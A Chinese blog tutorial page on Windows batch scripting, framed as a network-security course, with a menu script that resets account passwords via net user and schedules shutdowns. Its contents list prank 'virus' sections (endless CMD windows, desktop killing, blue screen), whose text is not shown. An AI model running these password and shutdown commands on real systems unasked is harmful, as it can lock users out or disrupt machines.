<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>网络安全基础03(上)：批处理与病毒 | cataLoc's Blog</title><meta name="description" content="网络安全基础03(上)：批处理与病毒"><meta name="keywords" content="网络安全"><meta name="author" content="cataLoc"><meta name="copyright" content="cataLoc"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/blog/img/favicon.ico"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="网络安全基础03(上)：批处理与病毒"><meta name="twitter:description" content="网络安全基础03(上)：批处理与病毒"><meta name="twitter:image" content="https://gitee.com/cataloc/blog/raw/master/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/cover0xC.png"><meta property="og:type" content="article"><meta property="og:title" content="网络安全基础03(上)：批处理与病毒"><meta property="og:url" content="http://cataloc.gitee.io/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/"><meta property="og:site_name" content="cataLoc's Blog"><meta property="og:description" content="网络安全基础03(上)：批处理与病毒"><meta property="og:image" content="https://gitee.com/cataloc/blog/raw/master/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/cover0xC.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'true'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/blog/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://cataloc.gitee.io/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/"><link rel="prev" title="网络安全基础03(下)：用户与组管理" href="http://cataloc.gitee.io/blog/2020/06/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8B-%E7%94%A8%E6%88%B7%E4%B8%8E%E7%BB%84%E7%AE%A1%E7%90%86/"><link rel="next" title="Dalvik虚拟机" href="http://cataloc.gitee.io/blog/2020/06/09/Dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/blog/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: 'Press',
    message_next: 'to bookmark this page'
  },
  runtime_unit: 'days',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  isHome: false,
  isPost: true
  
}</script><meta name="generator" content="Hexo 4.2.0"></head><body><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/blog/">cataLoc's Blog</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/blog/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/blog/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/blog/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/blog/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/blog/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/blog/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/blog/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/blog/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/blog/img/Substitute.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/blog/archives/"><div class="headline">Articles</div><div class="length_num">111</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/blog/tags/"><div class="headline">Tags</div><div class="length_num">7</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/blog/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/blog/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/blog/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/blog/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/blog/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/blog/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/blog/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/blog/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">Catalog</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#批处理"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">批处理</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#什么是批处理"><span class="toc_mobile_items-number">1.1.</span> <span class="toc_mobile_items-text">什么是批处理</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#如何创建批处理"><span class="toc_mobile_items-number">1.2.</span> <span class="toc_mobile_items-text">如何创建批处理</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#关闭回显与空行"><span class="toc_mobile_items-number">1.3.</span> <span class="toc_mobile_items-text">关闭回显与空行</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#变量与取值"><span class="toc_mobile_items-number">1.4.</span> <span class="toc_mobile_items-text">变量与取值</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#条件分支"><span class="toc_mobile_items-number">1.5.</span> <span class="toc_mobile_items-text">条件分支</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#批处理小实验"><span class="toc_mobile_items-number">1.6.</span> <span class="toc_mobile_items-text">批处理小实验</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#病毒"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">病毒</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#无限CMD"><span class="toc_mobile_items-number">2.1.</span> <span class="toc_mobile_items-text">无限CMD</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#伪装杀毒软件"><span class="toc_mobile_items-number">2.2.</span> <span class="toc_mobile_items-text">伪装杀毒软件</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#杀死桌面"><span class="toc_mobile_items-number">2.3.</span> <span class="toc_mobile_items-text">杀死桌面</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#蓝屏"><span class="toc_mobile_items-number">2.4.</span> <span class="toc_mobile_items-text">蓝屏</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#参考链接："><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">参考链接：</span></a></li></ol></div></div></div><div id="body-wrap"><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#批处理"><span class="toc-number">1.</span> <span class="toc-text">批处理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是批处理"><span class="toc-number">1.1.</span> <span class="toc-text">什么是批处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何创建批处理"><span class="toc-number">1.2.</span> <span class="toc-text">如何创建批处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关闭回显与空行"><span class="toc-number">1.3.</span> <span class="toc-text">关闭回显与空行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#变量与取值"><span class="toc-number">1.4.</span> <span class="toc-text">变量与取值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#条件分支"><span class="toc-number">1.5.</span> <span class="toc-text">条件分支</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#批处理小实验"><span class="toc-number">1.6.</span> <span class="toc-text">批处理小实验</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#病毒"><span class="toc-number">2.</span> <span class="toc-text">病毒</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#无限CMD"><span class="toc-number">2.1.</span> <span class="toc-text">无限CMD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#伪装杀毒软件"><span class="toc-number">2.2.</span> <span class="toc-text">伪装杀毒软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#杀死桌面"><span class="toc-number">2.3.</span> <span class="toc-text">杀死桌面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#蓝屏"><span class="toc-number">2.4.</span> <span class="toc-text">蓝屏</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接："><span class="toc-number">3.</span> <span class="toc-text">参考链接：</span></a></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(https://gitee.com/cataloc/blog/raw/master/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/cover0xC.png)"><div id="post-info"><div id="post-title"><div class="posttitle">网络安全基础03(上)：批处理与病毒</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> Created 2020-06-15<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> Updated 2020-06-23</time><div class="post-meta-wordcount"><div class="post-meta-pv-cv"><span><i class="fa fa-eye post-meta__icon fa-fw" aria-hidden="true"> </i>Post View:</span><span id="busuanzi_value_page_pv"></span></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><html><head></head><body><h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2><h3 id="什么是批处理"><a href="#什么是批处理" class="headerlink" title="什么是批处理"></a>什么是批处理</h3><p>在前面的文章中学习过Dos命令，单一的Dos命令能实现特定的功能，但功能较为单一；一行一行在命令行中输入Dos命令效率又不够高，因而产生一种方式，<strong>将</strong>这些<strong>Dos命令组织起来</strong>，并<strong>按照指令的顺序成批进行处理</strong>。这就是批处理，又被叫做脚本。</p>
<p>在Windows中，批处理是将Dos命令按照顺序组织起来成批执行；在Linux中也有一种形式，将bash命令组织起来成批执行，这种经过组织后的文件被称作Shell脚本。</p>
<h3 id="如何创建批处理"><a href="#如何创建批处理" class="headerlink" title="如何创建批处理"></a>如何创建批处理</h3><p><strong>新建一个文本文件，将后缀改为.bat形式保存</strong>，就得到了一个批处理文件，然后用记事本编辑即可。但是有些情况下，我们无法修改文件的后缀，此时需要做一个修改。打开Windows资源管理器 -> 工具 -> 文件夹选项 -> 查看，在高级设置中，有一个选项，隐藏已知文件类型的扩展名，将该扩展名的<strong>勾选去除</strong>，便可以修改文件后缀了。（<strong>注：本篇中的实验均基于Windows2003/WindowsXp，别的版本代码会有所改动</strong>）</p>
<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/suffix.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/suffix.png"></a>

<p>接下来，我们可以应用前一篇学到的Dos命令，写一个批处理文件，用来打印一些语句，编辑完，双击即可运行批处理文件。</p>
<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/hellobat.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/hellobat.png"></a>

<p>运行的结果看着很不友好，下面我们将学习更多的指令来对代码进行优化。</p>
<h3 id="关闭回显与空行"><a href="#关闭回显与空行" class="headerlink" title="关闭回显与空行"></a>关闭回显与空行</h3><p>批处理虽然的对代码成批进行处理，但真正执行时也只是一条条的指令进行执行。回顾刚刚的代码，命令行在执行时，将Dos命令一条条打印出来，再执行，这样视觉上很不美观，考虑不显示执行的语句，可以采用以下命令：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br></pre></td></tr></tbody></table></figure></div>

<p><strong>在批处理的开头，输入该指令，执行时就不会显示执行的指令了</strong>。此外，批处理在处理的过程中，是不会处理文件中的空行的，遇到会直接跳过，执行下一条Dos指令，这样难道就没法在批处理中打印空行了吗？同样，针对这一点Windows也提供了一条命令 ：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span>.</span><br></pre></td></tr></tbody></table></figure></div>

<p>该指令将会打印一行空行，可以理解为python中的print()或C++中cout << endl;的作用。</p>
<p>另一个指令是在前文中出现过的</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></tbody></table></figure></div>

<p>该指令的作用，就是停留在命令行界面，这样我们可以看到指令执行时的效果，否则一下就执行结束了；该指令与C/C++中的getchar()作用是一样的。</p>
<p>有了新学习的指令后，我们对刚刚的批处理作简单的修改：</p>
<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/hellobat_2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/hellobat_2.png"></a>

<p>这样看上去就清晰多了。</p>
<h3 id="变量与取值"><a href="#变量与取值" class="headerlink" title="变量与取值"></a>变量与取值</h3><p>批处理可以实现很多功能，自然需要一些基础功能的指令组合才能完成。这里介绍一个可以设置变量的指令，set指令。默认情况下，<strong>set指令可以设置一个变量的值</strong>，例如：</p>
<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/set.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/set.png"></a>

<p>该语句的意思是，<strong>使用set指令设置一个名为a的变量值为6</strong>，接着用echo语句打印它，可以发现，这里我们用了%a%的形式，这就是<strong>Dos命令中格式化的方式</strong>，可以类比python中的.format或者C语言中的%d。</p>
<p>设置变量可以做到了，那是否可以从缓冲区获取输入参数的值呢？答案是肯定的。仅需<strong>将set指令增加一个参数/p</strong>，就可以做到类似C++中的cin>>或C中scanf()功能的效果:</p>
<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/set_2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/set_2.png"></a>

<p>图中，<strong>name获取到的不是值，而是显示在命令行中的语句，接下来用户输入的值，才会赋给变量name</strong>。接下再打印name的值。有了/p参数，我们便可以从命令行中获取参数，增加程序的交互性。</p>
<h3 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h3><p>任何一门语言中，都会有条件分支，根据不同的条件，执行不同的代码。Windows也提供了相应的Dos命令，if和goto。这两个命令相互间配合，就可以做到类似switch语句实现的条件跳转。下面来看一下定义：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 命令：<span class="keyword">goto</span></span><br><span class="line">   含义：程序跳转到某个区块</span><br><span class="line">   语法：<span class="keyword">goto</span> menu (跳转到menu区块)</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. 命令：：</span><br><span class="line">   含义：定义一个区块</span><br><span class="line">   语法：：menu (定义menu区块)</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>. 命令：<span class="keyword">if</span></span><br><span class="line">   含义：条件判断</span><br><span class="line">   语法：<span class="keyword">if</span> <span class="variable">%a%</span>=="<span class="number">1</span>" <span class="keyword">goto</span> (如果变量a的值为<span class="number">1</span>，则跳转到menu区块继续接下来执行)</span><br></pre></td></tr></tbody></table></figure></div>

<p>有了这几条指令后，我们可以写一个小的批处理测试一下：</p>
<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/hellobat_3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/hellobat_3.png"></a>

<p>该批处理，实现很简单的功能，根据按下的数字为1还是2，打印相应的语句。</p>
<h3 id="批处理小实验"><a href="#批处理小实验" class="headerlink" title="批处理小实验"></a>批处理小实验</h3><p>在对批处理和大部分常用命令有所了解后，来进行一个练习，再做练习之前，需要再掌握一个指令：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 命令：<span class="built_in">net</span> user</span><br><span class="line">   含义：修改指定用户的密码</span><br><span class="line">   语法：<span class="built_in">net</span> user admin <span class="number">123456</span> (修改admin用户的密码为<span class="number">123456</span>)</span><br></pre></td></tr></tbody></table></figure></div>

<p>该指令用于修改用户密码，在练习中会用到。</p>
<p>这里练习编写一个批处理文件，能够实现一个简单的菜单功能，功能包括修改用户密码，定时关机以及退出。</p>
<p>我这里参照Beglage_buglige的代码，实现了一份类似功能的，执行效果如下：</p>
<a href="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/batTest.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img class="lazyload" data-src="/blog/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/batTest.png"></a>

<p>难度不大，可以先自己尝试，这里附上代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dos</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">title</span> are you ok?</span><br><span class="line"><span class="built_in">color</span> f3</span><br><span class="line">:menu</span><br><span class="line"><span class="built_in">echo</span> ----------------</span><br><span class="line"><span class="built_in">echo</span>     Menu</span><br><span class="line"><span class="built_in">echo</span>     <span class="number">1</span>.Modify Password </span><br><span class="line"><span class="built_in">echo</span>     <span class="number">2</span>.SetTime Shutdown</span><br><span class="line"><span class="built_in">echo</span>     <span class="number">3</span>.<span class="keyword">Exit</span></span><br><span class="line"><span class="built_in">echo</span> ----------------</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> /p num=您的选择是：   </span><br><span class="line"><span class="keyword">if</span> "<span class="variable">%num%</span>"=="<span class="number">1</span>" <span class="keyword">goto</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> "<span class="variable">%num%</span>"=="<span class="number">2</span>" <span class="keyword">goto</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> "<span class="variable">%num%</span>"=="<span class="number">3</span>" <span class="keyword">goto</span> <span class="number">3</span></span><br><span class="line"><span class="built_in">echo</span> Don't <span class="keyword">do</span> that!</span><br><span class="line"><span class="built_in">pause</span></span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> /p u=username:</span><br><span class="line"><span class="built_in">set</span> /p p=password:</span><br><span class="line"><span class="built_in">net</span> user <span class="variable">%u%</span> <span class="variable">%p%</span> ><span class="built_in">nul</span></span><br><span class="line"><span class="built_in">echo</span> Modify Password Succeed</span><br><span class="line"><span class="built_in">pause</span></span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line"></span><br><span class="line">:<span class="number">2</span></span><br><span class="line"><span class="built_in">set</span> /p <span class="built_in">time</span>=Input <span class="built_in">Time</span>:</span><br><span class="line">shutdown -s -t <span class="variable">%time%</span></span><br><span class="line"><span class="built_in">set</span> /p cancel=Cancel or <span class="keyword">Not</span>(<span class="number">0</span> or <span class="number">1</span>)?</span><br><span class="line"><span class="keyword">if</span> <span class="variable">%cancel%</span>==<span class="number">1</span> shutdown -a</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:<span class="number">3</span></span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></tbody></table></figure></div>





